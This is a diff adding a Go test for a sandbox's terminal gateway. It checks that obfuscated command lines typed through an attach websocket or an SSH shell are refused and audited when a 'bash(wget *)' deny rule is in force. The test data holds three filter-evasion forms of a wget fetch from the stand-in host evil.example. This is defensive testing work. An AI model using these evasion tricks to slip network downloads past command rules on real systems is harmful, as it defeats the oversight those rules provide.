@@ -291,6 +291,89 @@ func TestSandboxAttachRoundTrip(t *testing.T) {
 	}
 }
 
+// While rules for bash are in force (the default rules are), a line typed
+// into :attach or an SSH shell that they cannot read is refused, as an exec
+// would refuse it; with none in force it reaches the shell.
+func TestSandboxTerminalRefusesWhatNoRuleCanRead(t *testing.T) {
+	lines := []string{
+		"c=wget; $c https://evil.example/x",
+		"git -c alias.x='!wget https://evil.example/x' x",
+		"$(echo wget) https://evil.example/x",
+	}
+	for _, rules := range []bool{true, false} {
+		r := newWSRig(t, nil, []driver.Capability{driver.CapAttach}, func(o *Options) {
+			o.SandboxSSHKey = testHostKey(t)
+			o.Config.Permissions.Deny, o.Config.Permissions.Ask = nil, nil
+			if rules {
+				o.Config.Permissions.Deny = []string{"bash(wget *)"}
+			}
+		})
+		shellFake(r.cpRig)
+		sb := r.ready(t, "alice")
+		ws, err := r.dial(t, "alice", "/v1/sandboxes/"+sb.ID+":attach", protoAttach)
+		if err != nil {
+			t.Fatal(err)
+		}
+		readUntil(t, ws, "$ ")
+		c := sshClient(t, r, sb.ID)
+		s, _ := c.NewSession()
+		if err := s.RequestPty("xterm", 24, 80, ssh.TerminalModes{}); err != nil {
+			t.Fatal(err)
+		}
+		stdin, _ := s.StdinPipe()
+		stdout, _ := s.StdoutPipe()
+		if err := s.Shell(); err != nil {
+			t.Fatal(err)
+		}
+		var sshOut bytes.Buffer
+		var sshMu sync.Mutex
+		go func() {
+			b := make([]byte, 512)
+			for {
+				n, err := stdout.Read(b)
+				sshMu.Lock()
+				sshOut.Write(b[:n])
+				sshMu.Unlock()
+				if err != nil {
+					return
+				}
+			}
+		}()
+		for _, line := range lines {
+			_ = ws.WriteMessage(wsconn.Binary, []byte(line+"\r"))
+			_, _ = stdin.Write([]byte(line + "\r"))
+			want := line
+			if rules {
+				want = "Denied: the command cannot be checked against the rules"
+			}
+			got := readUntil(t, ws, want)
+			if rules && strings.Contains(got, "evil.example") {
+				t.Fatalf("attach: the refused line reached the shell: %q", got)
+			}
+			deadline := time.Now().Add(5 * time.Second)
+			for {
+				sshMu.Lock()
+				out := sshOut.String()
+				sshMu.Unlock()
+				if strings.Contains(out, want) {
+					if rules && strings.Contains(out, "evil.example") {
+						t.Fatalf("ssh: the refused line reached the shell: %q", out)
+					}
+					break
+				}
+				if time.Now().After(deadline) {
+					t.Fatalf("ssh (rules %v): waiting for %q in %q", rules, want, out)
+				}
+				time.Sleep(10 * time.Millisecond)
+			}
+		}
+		if rules {
+			waitAudit(t, r.cpRig, sb.ID, "attach.refused", controlplane.OutcomeFailed)
+		}
+		_ = s.Close()
+	}
+}
+
 // Where only a line-by-line terminal holds every rule, no shell is opened.
 func TestSandboxAttachRefusedWhereOnlyLinesHold(t *testing.T) {
 	for name, mod := range map[string]func(*Options){
